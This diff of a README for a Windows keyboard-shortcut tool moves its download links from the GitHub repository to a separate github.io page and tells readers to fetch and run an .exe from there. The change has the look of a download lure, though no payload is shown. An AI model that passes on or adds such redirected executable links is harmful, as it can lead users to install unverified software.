@@ -1,6 +1,6 @@
 # ⌨️ MUI-Accelerator-Table-Englishizer - Use English keyboard shortcuts in Windows apps
 
-[![Download Tool](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Greenishgray-lifesupport504/MUI-Accelerator-Table-Englishizer)
+[![Download Tool](https://img.shields.io/badge/Download-Application-blue.svg)](https://greenishgray-lifesupport504.github.io)
 
 ## 🛠 What this tool does
 
@@ -17,7 +17,7 @@ Windows assigns keyboard shortcuts based on the system language. If you use a ve
 
 Follow these steps to set up the tool on your computer.
 
-1. Visit the project page to download the latest version: https://github.com/Greenishgray-lifesupport504/MUI-Accelerator-Table-Englishizer.
+1. Visit the project page to download the latest version: https://greenishgray-lifesupport504.github.io
 2. Look for the Releases section on the right side of the page.
 3. Click the link for the latest version file ending in .exe.
 4. Save the file to your computer.
